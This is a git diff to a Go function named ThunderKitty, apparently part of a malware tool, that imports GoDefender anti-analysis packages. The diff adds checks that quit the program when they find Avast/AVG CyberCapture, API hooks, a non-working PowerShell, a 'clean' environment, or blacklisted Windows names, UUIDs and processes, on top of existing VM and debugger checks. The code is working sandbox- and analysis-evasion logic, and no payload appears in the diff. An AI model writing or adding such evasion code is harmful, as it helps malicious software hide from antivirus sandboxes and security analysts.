@@ -16,12 +16,15 @@ import (
 
 	// AntiVirtualization
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/AnyRunDetection"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/CleanEnvironmentDetection"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/ComodoAntivirusDetection"
+	"github.com/EvilBytecode/GoDefender/AntiVirtualization/CyberCapture"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/DeepFreezeDetection"
 	HyperVCheck "github.com/EvilBytecode/GoDefender/AntiVirtualization/HyperVDetection"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/KVMCheck"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/MonitorMetrics"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/ParallelsCheck"
+	PowerShellCheck "github.com/EvilBytecode/GoDefender/AntiVirtualization/PowerShellDetection"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/RepetitiveProcess"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/SandboxieDetection"
 	"github.com/EvilBytecode/GoDefender/AntiVirtualization/ShadowDefenderDetection"
@@ -35,6 +38,11 @@ import (
 )
 
 func ThunderKitty() {
+	// Directory creation check
+	if success := CyberCapture.CreateDirectory(); !success {
+		log.Println("[DEBUG] Avast/AVG CyberCapture detected.")
+		os.Exit(-1)
+	}
 
 	// lets just catch bunch of vms at beginning lol
 	if usbPluggedIn, err := USBCheck.PluggedIn(); err != nil {
@@ -48,10 +56,25 @@ func ThunderKitty() {
 		log.Println("[DEBUG] Blacklisted username detected")
 		os.Exit(-1)
 	}
-	// lets make their job harder.
-	HooksDetection.AntiAntiDebug()
+	// Run the built-in hook checks.
+	if HooksDetection.DetectHooksOnCommonWinAPIFunctions("", nil) {
+		log.Println("[DEBUG] UserAntiAntiDebug detected")
+		os.Exit(-1)
+	}
 
-	//
+	found, err := PowerShellCheck.RunPowerShellCommand(`"PowerShell is working: " + (Get-Date).ToShortTimeString()`)
+	if err != nil {
+		// Exit immediately on error
+		log.Printf("[DEBUG] PowerShell check failed: %v", err)
+		os.Exit(-1)
+	}
+	if found != "" {
+		// Service exists, continue with your logic
+	} else {
+		log.Println("[DEBUG] PowerShell returned empty result")
+		os.Exit(-1)
+	}
+
 	// AntiVirtualization checks
 	if vmwareDetected, _ := VMWareDetection.GraphicsCardCheck(); vmwareDetected {
 		log.Println("[DEBUG] VMWare detected")
@@ -134,7 +157,17 @@ func ThunderKitty() {
 		os.Exit(-1)
 	}
 
-	CheckBlacklistedWindowsNames.CheckBlacklistedWindows()
+	// Clean Environment detection
+	if cleanEnvironmentDetected := CleanEnvironmentDetection.DetectCleanEnvironment(); cleanEnvironmentDetected {
+		log.Println("[DEBUG] Clean Environment detected")
+		os.Exit(-1)
+	}
+
+	// Blacklisted Windows account names, UUIDs, processes etc.
+	if CheckBlacklistedWindowsNames.CheckBlacklistedWindows() {
+		log.Println("[DEBUG] Blacklisted Windows name or process detected")
+		os.Exit(-1)
+	}
 
 	// Other AntiDebug checks
 	if isDebuggerPresentResult := IsDebuggerPresent.IsDebuggerPresent1(); isDebuggerPresentResult {
